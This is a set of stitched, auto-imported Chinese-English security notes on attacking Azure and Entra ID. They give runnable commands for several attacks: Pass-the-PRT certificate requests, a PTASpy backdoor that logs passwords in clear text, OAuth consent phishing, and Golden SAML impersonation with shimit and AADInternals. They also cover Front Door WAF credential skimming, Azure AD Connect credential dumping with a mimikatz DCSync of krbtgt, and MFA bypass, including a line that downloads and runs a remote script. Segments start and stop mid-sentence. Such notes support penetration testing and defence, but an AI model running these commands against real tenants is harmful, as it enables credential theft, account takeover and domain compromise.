The machine (client) initiating the connection needs a certificate from Entra ID for a user. Client creates a JSON Web 令牌 (JWT) header containing PRT and other details, sign it using the Derived key (using the session key and the security context) and sends it to Entra ID Entra ID verifies the JWT signature using client session key and security context, checks validity of PRT and responds with the certificate. In this scenario and after grabbing all the info needed for a Pass the PRT attack: It's possible to request P2P certificate for the user with the tool PrtToCert**😗* # 命令 / 载荷 / 操作片段 # 1. Pass the Certificate (Azure) 1RequestCert.py [-h] --tenantId TENANTID --prt PRT --userName USERNAME --hexCtx HEXCTX --hexDerivedKey HEXDERIVEDKEY [--passPhrase PASSPHRASE] # 2. Pass the Certificate (Azure) 1Main.py [-h] --usercert USERCERT --certpass CERTPASS --remoteip REMOTEIP # 工具与参考入口 PrtToCert AzureADJoinedMachinePTC https://medium.com/@mor2464/azure-ad-pass-the-certificate-d0c5de624597 # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 AD CS 证书攻击 云身份与权限 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

title: Az：PTA：Pass-through 认证
content: 来源路径： 02-知识点/云与容器/Az：PTA：Pass-through 认证.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Az：PTA：Pass-through 认证 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 Az：PTA：Pass-through 认证 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 Az：PTA：Pass-through 认证 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：Basic Information、认证 flow、枚举、Pivoting、Seamless SSO；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 3 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Basic Information 认证 flow 枚举 Pivoting Seamless SSO # 核心要点 In PTA identities are synchronized but passwords aren't like in PHS. To login the user is redirected to Azure AD, where he sends the username and 密码 The 凭据 are encrypted and set in a queue in Azure AD The on-prem 认证 agent gathers the 凭据 from the queue and decrypts them. This agent is called "Pass-through 认证 agent" or PTA agent. The agent validates the creds against the on-prem AD and sends the response back to Azure AD which, if the response is positive, completes the login of the user. If an attacker compromises the PTA he can see the all 凭据 from the queue (in clear-text).\ Injects PTASpy.dll to AzureADConnectAuthenticationAgentService process # 命令 / 载荷 / 操作片段 # 1. 枚举 123456789101112131415161718192021222324az rest --url 'https://graph.microsoft.com/beta/onPremisesPublishingProfiles/authentication/agentGroups?$expand=agents'# Example response:{ "@odata.context": "https://graph.microsoft.com/beta/$metadata#onPremisesPublishingProfiles('authentication')/agentGroups(agents())", "value": [ { "agents": [ { "externalIp": "20.121.45.57", "id": "4a000eb4-9a02-49e4-b67f-f9b101f8f14c", "machineName": "ConnectSync.hacktricks-con.azure", "status": "active", "supportedPublishingTypes": [ "authentication" ] } ], "displayName": "Default group for Pass-through Authentication", "id": "d372d40f-3f81-4824-8b9e-6028182db58e", "isDefault": true, "publishingType": "authentication" } ]} # 2. 枚举 1Get-Service -Name "AzureADConnectAuthenticationAgent" # 3. Pivoting 123456Install-Module AADInternals -RequiredVersion 0.9.3Import-Module AADInternalsInstall-AADIntPTASpy # Install the backdoor, it'll save all the passwords in a fileGet-AADIntPTASpyLog -DecodePasswords # Read the file or use this to read the passwords in clear-textRemove-AADIntPTASpy # Remove the backdoor # 工具与参考入口 From the docs: Microsoft Visual C++ 2015 Redistributables https://aadinternals.com/post/on-prem admin/#pass-through - 认证 # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/云与容器/Az：OAuth Apps Phishing 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Az：OAuth Apps Phishing 技术笔记 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 Az：OAuth Apps Phishing 技术笔记 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 Az：OAuth Apps Phishing 技术笔记 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：Az：OAuth Apps Phishing、OAuth App Phishing、App consent permissions、2 Types of attacks、Users are allowed to consent；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Az：OAuth Apps Phishing OAuth App Phishing App consent permissions 2 Types of attacks Users are allowed to consent Application Admins Attack Flow Overview Example Attack Other 工具 Post - 利用 Phishing Post - 利用 Entra ID Applications Admin Application 后渗透 # 核心要点 Moreover, if users can consent only to apps using low risk permissions, these permissions are by default openid, profile, email, User.Read and offline access, although it's possible to add more to this list. Unauthenticated: From an external account create an application with the low risk permissions User.Read and User.ReadBasic.All for example, phish a user, and you will be able to access directory information. If the phised user is an some admin that can consent any app with any permissions, the application could also request privileged permissions Authenticated: Having compromised a principal with enough privileges, create an application inside the account and phish some privileged user which can accept privileged OAuth permissions. In this case you can already access the info of the directory, so the permission User.ReadBasic.All isn't no longer interesting. You are probable interested in permissions that require and admin to grant them, because raw user cannot give OAuth apps any permission, thats why you need to phish only those users (more on which roles/permissions grant this privilege later) O365-Attack-Toolkit Note that it’s possible to add redirect URIs (no need to delete the real one) and then send a HTTP link using the attackers redirect URI so when the user follows the link the 认证 occurs automatically and the attacker receives the 令牌. It’s also possible to change the permissions the app asks for in order to get more permission from the users, but in that case the user will need to accept again the prompt (even if he was already logged in). To perform this attack the attacker DOESN'T NEED to control the application code as he could just send the link to login in the app to the user with the new URL in the redirect uri parameter. # 命令 / 载荷 / 操作片段 # 1. Users are allowed to consent 1az rest --method GET --url "https://graph.microsoft.com/v1.0/policies/authorizationPolicy" # 2. Users are allowed to consent 1az rest --method GET --url "https://graph.microsoft.com/v1.0/policies/permissionGrantPolicies" # 3. Application Admins 1234567891011# Get list of rolesaz rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles"# Get Global Administratorsaz rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/1b2256f9-46c1-4fc2-a125-5b2f51bb43b7/members"# Get Application Administratorsaz rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/1e92c3b7-2363-4826-93a6-7f7a5b53e7f9/members"# Get Cloud Applications Administratorsaz rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/0d601d27-7b9c-476f-8134-8e7cd6744f02/members" # 4. Example Attack 12# From https://github.com/carlospolop/azure_oauth_phishing_examplepython3 azure_oauth_phishing_example.py --client-secret <client-secret> --client-id <client-id> --scopes "email,Files.ReadWrite.All,Mail.Read,Notes.Read.All,offline_access,openid,profile,User.Read" # 5. Example Attack 12345678910111213141516171819export ACCESS_TOKEN=<ACCESS_TOKEN># List drive filescurl -X GET \ https://graph.microsoft.com/v1.0/me/drive/root/children \ -H "Authorization: Bearer $ACCESS_TOKEN" \ -H "Accept: application/json"# List eailscurl -X GET \ https://graph.microsoft.com/v1.0/me/messages \ -H "Authorization: Bearer $ACCESS_TOKEN" \ -H "Accept: application/json"# List notescurl -X GET \ https://graph.microsoft.com/v1.0/me/onenote/notebooks \ -H "Authorization: Bearer $ACCESS_TOKEN" \ -H "Accept: application/json" # 工具与参考入口 azure oauth phishing example 365-Stealer https://www.alteredsecurity.com/post/introduction-to-365-stealer O365-Attack-Toolkit https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/ # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

It has two different deployment models: The options are very similar to an Azure SQL Server. If MySQL auth is enabled it’ll be possible to login with username + 密码 Networking: It’s possible to allow public access indicating allowed IP addresses and private endpoints can also be used. Moreover it’s possible to allow access from any Azure service and configure more firewall rules. {｛#tab name="Az Powershell" }} Also you can execute queries with github but the 密码 and user are also needed. In general, due to the lack of flexibity on the configuration of the new domain and the fact that ADs are usually already on-premise, this is not the main integration between Entra ID and AD, but still interesting to know how to compromise it. Denied RODC 密码 Replication Group: This is a group that specifies users and groups whose passwords cannot be cached on RODCs (Read-Only Domain Controllers). DnsAdmins: This group allows to manage the DNS settings and was abused in the past to escalate privileges and compromise the domain, however after testing the attack in this environment it was checked that the 漏洞 is patched: Note that in the past other vulnerabilities in this managed AD were found that allowed to compromise the DCs, like this one. An attacker compromising the DC could very easily maintain 持久化 without the Azure admins noticing or even being able to remove it. # 命令 / 载荷 / 操作片段 # 1. Pivoting 12345dnscmd TDW52Y80ZE26M1K.azure.hacktricks-training.com /config /serverlevelplugindll \\10.1.0.6\c$\Windows\Temp\adduser.dllDNS Server failed to reset registry property. Status = 5 (0x00000005)Command failed: ERROR_ACCESS_DENIED 5 0x5 # 2. 枚举 1234567891011121314151617181920212223242526272829303132333435363738394041# Get configured domain services domains (you can add more subs to check in more subscriptions)az rest --method post \ --url "https://management.azure.com/providers/Microsoft.ResourceGraph/resources?api-version=2021-03-01" \ --body '{ "subscriptions": [ "0ce1297c-9153-425d-3229-f51093614377" ], "query": "resources | where type == \"microsoft.aad/domainservices\"", "options": { "$top": 16, "$skip": 0, "$skipToken": "" } }'# Get domain configurationaz rest --url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/entra-domain-services/providers/Microsoft.AAD/DomainServices/<domain-name>?api-version=2022-12-01&healthdata=true"## e.g.az rest --url "https://management.azure.com/subscriptions/0ce1297c-9153-425d-3229-f51093614377/resourceGroups/entra-domain-services/providers/Microsoft.AAD/DomainServices/azure.hacktricks-training.com?api-version=2022-12-01&healthdata=true"# Based on the VNet assigned to the domain services, you can enumerate the VMs in the domainsubscription_id="0ce1297c-9153-425d-3229-f51093614377"vnet_name="aadds-vnet"# Retrieve all VMs in the subscriptionvm_list=$(az vm list --subscription "$subscription_id" --query "[].{Name:name, ResourceGroup:resourceGroup}" --output tsv)# Iterate through each VM to check their VNet connectionecho "VMs connected to VNet '$vnet_name':"while IFS=$'\t' read -r vm_name resource_group; do nic_ids=$(az vm show --subscription "$subscription_id" --name "$vm_name" --resource-group "$resource_group" --query "networkProfile.networkInterfaces[].id" --output tsv) for nic_id in $nic_ids; do subnet_id=$(az network nic show --ids "$nic_id" --query "ipConfigurations[0].subnet.id" --output tsv) if $vnet_name"*; then echo "VM Name: $vm_name, Resource Group: $resource_group" fi donedone <<< "$vm_list" # 工具与参考入口 escalate privileges and compromise the domain like this one # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

It relies on a 容器 App Connected Environment. A workflow is a structured sequence of automated steps or tasks that execute a specific process or objective. It defines how different actions, conditions, and decisions interact to achieve a desired outcome, streamlining operations and reducing manual effort. Workflow triggers indicate when the workflow should start. Triggers could be an HTTP endpoint, a schedule, or tens of different events from Azure or even external apps. The URL format for vaults is https://{vault-name}.vault.azure.net/{object-type}/{object-name}/{object-version} and for managed HSM pools it's: https://{hsm-name}.managedhsm.azure.net/{object-type}/{object-name}/ object-type can be "keys", "secrets" or "certificates" Azure RBAC (most common and recommended) You can find all the granular permissions supported in https://learn.microsoft.com/en-us/azure/role-based-access-control/permissions/security#microsoftkeyvault The management plane, whose target is management.azure.com. It's used to manage the key vault and access policies. Only Azure role based access control (RBAC) is supported. The data plane, whose target is <vault-name>.vault.azure.com. It's used to manage and access the data (keys, secrets and certificates) in the key vault. This supports key vault access policies or Azure RBAC. # 命令 / 载荷 / 操作片段 # 1. Moreover, modifying the code inside the bucket (in the different formats it could be stored), the code of the app will be modified to the new one and executed next time the Function is called. This is very interesting from an attackers perspective as write access over this bucket will allow an attacker to compromise the code and escalate privileges to the managed identities inside the Function App. More on this in the 权限提升 section. It's also possible to find the master and functions keys stored in the storage account in the 容器 azure-webjobs-secrets inside the folder <app-name> in the JSON files you can find inside. Stealth and variants Prerequisites # 核心要点 To 绕过 this rule automated 工具 can be used that brute-force IP addresses until it finds a valid one. Abuse Azure Front Door (AFD) WAF Custom Rules in combination with Log Analytics to capture cleartext 凭据 (or other secrets) traversing the WAF. This is not a CVE; it’s misuse of legitimate features by anyone who can modify the WAF policy and read its logs. AFD writes verbose diagnostics to Log Analytics under Category FrontDoorWebApplicationFirewallLog. Matched 载荷 details are included in details matches s along with the rule name in ruleName s. Inspect the login form and note parameter names (e.g., username, 密码). Name: innocuous name, e.g., PasswordCapture Match: POST arguments username and 密码 with Operator = Any (match any value) Application Gateway WAF custom-rule logs don’t include the offending POST/header values the same way; AFD WAF diagnostics include matched content in details, enabling credential capture. You can target any sensitive names/locations, not only POST params (e.g., headers like 授权 or API tokens in body fields). An existing Azure Front Door instance. Permissions to edit the AFD WAF policy and read the associated Log Analytics workspace. # 命令 / 载荷 / 操作片段 # 1. End-to-end workflow 123curl -i -X POST https://example.com/login \ -H "Content-Type: application/x-www-form-urlencoded" \ --data "username=alice&password=S3cret!" # 2. End-to-end workflow 12345AzureDiagnostics| where Category == "FrontDoorWebApplicationFirewallLog"| where ruleName_s == "PasswordCapture"| project TimeGenerated, ruleName_s, details_matches_s| order by TimeGenerated desc # 3. End-to-end workflow 123456AzureDiagnostics| where Category == "FrontDoorWebApplicationFirewallLog" and ruleName_s == "PasswordCapture"| extend m = parse_json(details_matches_s)| mv-expand match = m.matches| project TimeGenerated, ruleName_s, match.matchVariableName, match.matchVariableValue| order by TimeGenerated desc # 工具与参考入口 blog post Microsoft documentation Skimming 凭据 with Azure's Front Door WAF Azure WAF on Front Door monitoring and logging # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/云与容器/Az：Federation 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Az：Federation 技术笔记 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 Az：Federation 技术笔记 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 Az：Federation 技术笔记 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：Az：Federation、Basic Information、Pivoting、Golden SAML、AWS + AD FS + Golden SAML；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Az：Federation Basic Information Pivoting Golden SAML AWS + AD FS + Golden SAML On-prem -> cloud # 核心要点 Basically, in Federation, all 认证 occurs in the on-prem environment and the user experiences SSO across all the trusted environments. Therefore, users can access cloud applications by using their on-prem 凭据. Initially, an application (Service Provider or SP, such as AWS console or vSphere web client) is accessed by a user. This step might be bypassed, leading the client directly to the IdP (Identity Provider) depending on the specific implementation. If you want to learn more about SAML 认证 and common attacks go to: https://book.hacktricks.wiki/en/pentesting-web/saml-attacks/index.html Claims for a user are written inside the SAML tokens and are then signed to provide confidentiality by the IdP. A user is identified by ImmutableID. It is globally unique and stored in Azure AD. Golden SAML attack: In ADFS, SAML Response is signed by a 令牌 - signing certificate. If the certificate is compromised, it is possible to authenticate to the Azure AD as ANY user synced to Azure AD! Just like our PTA abuse, 密码 change for a user or MFA won't have any effect because we are forging the 认证 response. The certificate can be extracted from the AD FS server with DA privileges and then can be used from any internet connected machine. The 令牌 - signing private key does not automatically renew. Changing a user’s 密码 does not invalidate an already generated SAML. 令牌 - signing private key # 命令 / 载荷 / 操作片段 # 1. AWS + AD FS + Golden SAML 1234567891011# From an "AD FS" session# After having exported the key with mimikatz# ADFS Public Certificate[System.Convert]::ToBase64String($cer.rawdata)# IdP Name(Get-ADFSProperties).Identifier.AbsoluteUri# Role Name(Get-ADFSRelyingPartyTrust).IssuanceTransformRule # 2. AWS + AD FS + Golden SAML 123456789101112# Apply session for AWS clipython .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust# pk - Private key file full path (pem format)# c - Certificate file full path (pem format)# u - User and domain name e.g. domain\username (use \ or quotes in *nix)# n - Session name in AWS# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.# id - AWS account id e.g. 123456789012# Save SAMLResponse to filepython .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml # 3. On-prem -> cloud 12345678910111213141516# With a domain user you can get the ImmutableID of the target user[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())# On AD FS server execute as administratorGet-AdfsProperties | select identifier# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.# You need to use the one from AzureAD.# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri# Extract the ADFS token signing certificate from the ADFS server using AADInternalsExport-AADIntADFSSigningCertificate# Impersonate a user to to access cloud appsOpen-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose # 4. On-prem -> cloud 123456789# Create a realistic ImmutableID and set it for a cloud only user[System.Convert]::ToBase64String((New-Guid).tobytearray())Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="# Extract the ADFS token signing certificate from the ADFS server using AADInternalsExport-AADIntADFSSigningCertificate# Impersonate the userOpen-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose # 工具与参考入口 From the docs: 黄金票据 attack mimikatz shimit https://learn.microsoft.com/en-us/azure/active-d

The graph.windows.net impersonation path via Exchange Hybrid actor tokens has been fixed. The old "Exchange to arbitrary Entra admin over Graph" chain should be considered removed for this specific 令牌 route. This is the most important correction when documenting the attack: keep the Exchange/SharePoint impersonation risk separate from the now-patched Graph impersonation escalation. Microsoft's long-term mitigation is splitting the on-prem and Exchange Online identities so the shared-service-principal trust path no longer exists. Environments that completed that migration materially reduce this attack surface. # 工具与参考入口 https://www.youtube.com/watch?v=rzfAutv6sB8 # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Even if the app doesn't appear in the console, a sysadmin could block that application so users cannot access using 工具 that connects via that App. However, there are other client-ids of applications that will allow you to connect to Azure: ../az-privilege-escalation/az-entraid-privesc/az-conditional-access-policies-mfa - 绕过.md ../az-privilege-escalation/az-entraid-privesc/dynamic-groups.md The Owner of a Service Principal can change its 密码. When registering a device, the user is asked to login with his account (asking for MFA if needed), then it request tokens for the device registration service and then ask a final confirmation prompt. Then, two RSA keypairs are generated in the device: The device key (public key) which is sent to AzureAD and the transport key (private key) which is stored in TPM if possible. Then, the object is generated in AzureAD (not in Intune) and AzureAD gives back to the device a certificate signed by it. content: 来源路径： 02-知识点/云与容器/Az：Defender 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Az：Defender 技术笔记 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 Az：Defender 技术笔记 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 Az：Defender 技术笔记 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：Az：Defender、Microsoft Defender for Cloud、Key Features、Microsoft Defender EASM、Microsoft Sentinel；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页当前以概念和流程为主；后续实验时可补充最小复现命令和输出样例。 # 关键主题 Az：Defender Microsoft Defender for Cloud Key Features Microsoft Defender EASM Microsoft Sentinel Microsoft Sentinel Configuration Main Features # 核心要点 By supporting AWS and GCP and other SaaS platforms natively and using Azure Arc for on-premises servers, it ensures you can manage security in one place for all environments​. Attack Path Analysis: Attack Path Analysis visually maps potential attack routes across your cloud resources. By showing how vulnerabilities connect and could be exploited, it helps you understand and break these paths to prevent breaches. 检测 techniques are based on threat intelligence, behavioral analytics and anomaly 检测. It’s possible to find all the possible alerts in https://learn.microsoft.com/en-us/azure/defender-for-cloud/alerts-reference. Based on the name and description it’s possible to know what is the alert looking for (to 绕过 it). Firewall Manager: The Firewall Manager integrates with Azure Firewall to give you a centralized view of your network security policies. It simplifies managing and monitoring firewall deployments, ensuring consistent application of security rules across your virtual networks. DevOps Security: DevOps Security integrates with your development pipelines and code repositories to embed security early in the software lifecycle. It helps identify vulnerabilities in code and configurations, ensuring that security is built into the development process. Microsoft Sentinel is a cloud-native SIEM (Security Information and Event Management) and SOAR (Security Orchestration, Automation, and Response) solution on Azure​. Sentinel leverages Azure services like Log Analytics (for massive log storage and query) and Logic Apps (for automated workflows) – this means it can scale on demand and integrate with Azure’s AI and automation capabilities​. In essence, Sentinel collects and analyzes logs from various sources, detects anomalies or malicious activities, and allows security teams to investigate and respond to threats quickly, all through the Azure portal without needing on-premises SIEM infrastructure​. You start by enabling Sentinel on an Azure Log Analytics workspace (the workspace is where logs will be stored and analyzed). Below are the high-level steps to get started: Enable Microsoft Sentinel on a Workspace: In the Azure portal, create or use an existing Log Analytics workspace and add Microsoft Sentinel to it. This deploys Sentinel’s capabilities to your workspace. Apply Analytics Rules and Content: With data flowing in, enable built‑in analytics rules or create custom ones to detect threats. Use the Content Hub for pre‑packaged rule templates and workbooks that jump‑start your 检测 capabilities. # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 云身份与权限 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

The new recommended way is to use Entra Cloud Sync: A managed service account ADSyncMSA<id> is created in the on-prem AD without any special default privileges. In Entra ID the Service Principal ConnectSyncProvisioning ConnectSync <id> is created with a certificate. From the docs: 密码 哈希 synchronization is one of the sign-in methods used to accomplish hybrid identity. Azure AD Connect synchronizes a 哈希，of the 哈希，of a user's 密码 from an on-premises Active Directory 域 instance to a cloud-based Azure AD instance. Basically, all users and a 哈希 of the 密码 hashes are synchronized from the on-prem to Azure AD. However, clear-text passwords or the original hashes aren't sent to Azure AD. When an on-prem user wants to access an Azure resource, the 认证 takes place on Azure AD. Users from the Cert Publishers Group that can publish certificates to Active Directory 域. Users of any other group with high privileges without the adminCount attribute to 1. ADSynchronization.ReadWrite.All Microsoft 密码 reset service PasswordWriteback.OffboardClient.All PasswordWriteback.RefreshClient.All PasswordWriteback.RegisterClientVersion.All If 密码 writeback is enabled, you can modify the 密码 of any user in the AD that is synchronized with Entra ID. # 命令 / 载荷 / 操作片段 # 1. Enumerating Connect Sync 12az rest --url "https://graph.microsoft.com/v1.0/directory/onPremisesSynchronization"# Check if password sychronization is enabled, if password and group writeback are enabled... # 3. Abusing MSOL\ * 1234567891011121314# Once the Azure AD connect server is compromised you can extract credentials with the AADInternals moduleInstall-Module -Name AADInternals -RequiredVersion 0.9.0 # Uninstall-Module AADInternals if you have a later versionImport-Module AADInternalsGet-AADIntSyncCredentials# Or check DumpAADSyncCreds.exe from https://github.com/Hagrid29/DumpAADSyncCreds/tree/main# Using https://github.com/dirkjanm/adconnectdumppython .\adconnectdump.py [domain.local]/administrator:<password>@192.168.10.80.\ADSyncQuery.exe C:\Users\eitot\Tools\adconnectdump\ADSync.mdf > out.txtpython .\adconnectdump.py [domain.local]/administrator:<password>@192.168.10.80 --existing-db --from-file out.txt# Using the creds of MSOL_* account, you can run DCSync against the on-prem ADrunas /netonly /user:defeng.corp\MSOL_123123123123 cmdInvoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"' # 4. And if for example the policy was configuring MFA, the attacker will be able to 绕过 it. Can be bypassed using a VPN or Proxy to connect to a country or managing to login from an allowed IP address If “Any device” is not selected but all the other options are selected it’s possible to 绕过 it using a random user-agent not related to those platforms To 绕过 login with a not selected option This won’t affect an attacker unless he is trying to abuse any of those protocols in a phishing attempt to access the victims account If this is set in the conditional policy, an attacker could just use a VPN in the allowed country or try to find a way to access from an allowed IP address to 绕过 these conditions. # 命令 / 载荷 / 操作片段 # 1. 枚举 12345# Get all the policies from Azure without needing any special permission with (idea from https://github.com/LuemmelSec/APEX/blob/main/APEX.ps1)az rest --method GET --uri 'https://graph.windows.net/<tenant-id>/policies?api-version=1.61-internal' | jq '.value[] | select(.policyType == 18) | {displayName, policyDetail: (.policyDetail[] | fromjson)}'# You need Policy.Read.ConditionalAccess or Policy.Read.All permission in Entra IDaz rest --method get --uri "https://graph.microsoft.com/beta/identity/conditionalAccess/policies" # 2. Cloud Apps 123roadrecon auth -u user@email.com -r https://outlook.office.com/ -c 1fec8e78-bce4-4aaf-ab1b-5451cc387264 --tokens-stdout<token> # 3. Compliant Devices 1234567$prtKeys = Get-AADIntuneUserPRTKeys - PfxFileName .\<uuid>.pfx -Credentials $credentials$prtToken = New-AADIntUserPRTToken -Settings $prtKeys -GertNonceGet-AADIntAccessTokenForAADGraph -PRTToken $prtToken<token returned> # 4. roadrecon 1roadrecon plugin policies # 5. Invoke-MFASweep 12Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1").ContentInvoke-MFASweep -Username <username> -Password <pass> # 6. ROPCI 1234./ropci configure./ropci apps list --all --format json -o apps.json./ropci apps list --all --format json | jq -r '.value[] | [.displayName,.appId] | @csv' > apps.csv./ropci auth bulk -i apps.csv -o results.json # 7. donkeytoken 1234$username = "conditional-access-app-user@azure.hacktricks-training.com"$password = [REDACTED_SECRET] "Poehurgi78633" -AsPlainText -Force$cred = New-Object System.Management.Automation.PSCredential($username, $password)Invoke-MFATest -credential $cred -Verbose -Debug -InformationAction Continue # 8. donkeytoken 12$token = [REDACTED_SECRET] -credential $cred -token_type microsoft.graph -extension_type Microsoft_IntuneRead-JWTtoken -token $token.access_token # 9. donkeytoken 1$data = Get-SharePointFilesFromGraph -authentication $token $data[0].downloadUrl # 工具与参考入口 browser extension like this one AzureAppsSweep ROPCI roadrecon Invoke-MFASweep donkeytoken https://www.youtube.com/watch?v=yOJ6yB9anZM&t=296s https://www.youtube.com/watch?v=xei8lAPitX8 # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 云身份与权限 Pwn 基础链路 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

